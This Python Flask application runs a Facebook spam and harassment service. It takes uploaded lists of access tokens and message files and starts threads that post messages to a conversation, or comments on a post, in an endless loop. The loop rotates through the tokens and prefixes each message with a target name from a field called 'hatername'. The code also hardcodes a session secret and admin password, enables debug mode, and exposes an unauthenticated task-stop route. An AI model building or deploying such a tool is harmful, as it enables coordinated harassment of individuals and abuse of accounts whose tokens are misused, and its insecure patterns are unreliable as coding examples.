from flask import Flask, request, render_template, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.debug = True

# Secret key for sessions
app.secret_key = 'k8m2p9x7w4n6q1v5z3c8b7f2j9r4t6y1u3i5o8e2a7s9d4g6h1l3'

# Admin credentials
ADMIN_USERNAME = 'Blinder'
ADMIN_PASSWORD = 'Rulex'

# ----------------- Running Tasks Dictionary -----------------
running_tasks = {}  
# Format: { "username/ip": { "task_id": {"type": "convo/post", "status": "running"} } }

# In-memory task tracking
stop_events = {}
threads = {}

# Facebook API headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)...',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

# Helper to identify a device/user (by IP)
def get_user_id():
    ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '').split(',')[0].strip()
    return ip


# ----------------- Home -----------------
@app.route('/')
def home():
    return render_template("home.html")


# ----------------- Convo Task -----------------
@app.route('/convo', methods=['GET','POST'])
def convo():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        # Track running task
        username = session.get("username", get_user_id())
        running_tasks.setdefault(username, {})[task_id] = {"type": "convo", "status": "running"}

        return redirect(url_for("my_tasks"))

    return render_template("convo_form.html")


def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                print("✅" if response.status_code == 200 else "❌", message)
                time.sleep(time_interval)


# ----------------- Post Task -----------------
@app.route('/post', methods=['GET','POST'])
def post():
    if request.method == 'POST':
        count = int(request.form.get('count', 0))

        for i in range(1, count + 1):
            post_id = request.form.get(f"id_{i}")
            hname = request.form.get(f"hatername_{i}")
            delay = request.form.get(f"delay_{i}")
            token_file = request.files.get(f"token_{i}")
            msg_file = request.files.get(f"comm_{i}")

            if not (post_id and hname and delay and token_file and msg_file):
                return f"❌ Missing required fields for post #{i}"

            tokens = token_file.read().decode().strip().splitlines()
            comments = msg_file.read().decode().strip().splitlines()

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
            stop_events[task_id] = Event()
            thread = Thread(target=post_comments, args=(post_id, tokens, comments, hname, int(delay), task_id))
            thread.start()
            threads[task_id] = thread

            # Track running task
            username = session.get("username", get_user_id())
            running_tasks.setdefault(username, {})[task_id] = {"type": "post", "status": "running"}

        return redirect(url_for("my_tasks"))

    return render_template("post_form.html")


def post_comments(post_id, tokens, comments, hname, delay, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    while not stop_event.is_set():
        comment = f"{hname} {random.choice(comments)}"
        token = tokens[token_index % len(tokens)]
        url = f"https://graph.facebook.com/{post_id}/comments"
        res = requests.post(url, data={"message": comment, "access_token": token})
        print("✅" if res.status_code == 200 else "❌", comment)
        token_index += 1
        time.sleep(delay)


# ----------------- Stop Task (User/Admin) -----------------
@app.route("/stop_task/<username>/<task_id>")
def stop_task(username, task_id):
    user_tasks = running_tasks.get(username, {})
    if task_id in user_tasks:
        if task_id in stop_events:
            stop_events[task_id].set()
        user_tasks.pop(task_id)

    return redirect(url_for("my_tasks"))


# ----------------- User Tasks Page -----------------
@app.route("/my_tasks")
def my_tasks():
    username = session.get("username", get_user_id())
    user_tasks = running_tasks.get(username, {})
    return render_template("my_tasks.html", username=username, tasks=user_tasks)


# ----------------- Admin Panel (Optional Keep) -----------------
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_tasks'))

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            session.permanent = True
            return redirect(url_for('admin_tasks'))
        else:
            return render_template('admin_login.html', error=True)
    return render_template('admin_login.html')


@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('home'))


@app.route("/admin/tasks")
def admin_tasks():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
    return render_template("admin_tasks.html", running_tasks=running_tasks)


# ----------------- Self-Ping Feature -----------------
def self_ping():
    url = "https://cha7-upda7ed.onrender.com"
    while True:
        try:
            requests.get(url)
            print("🌐 Self-ping successful")
        except:
            print("⚠️ Self-ping failed")
        time.sleep(300)


if __name__ == '__main__':
    ping_thread = Thread(target=self_ping, daemon=True)
    ping_thread.start()
    app.run(host='0.0.0.0', port=10000)
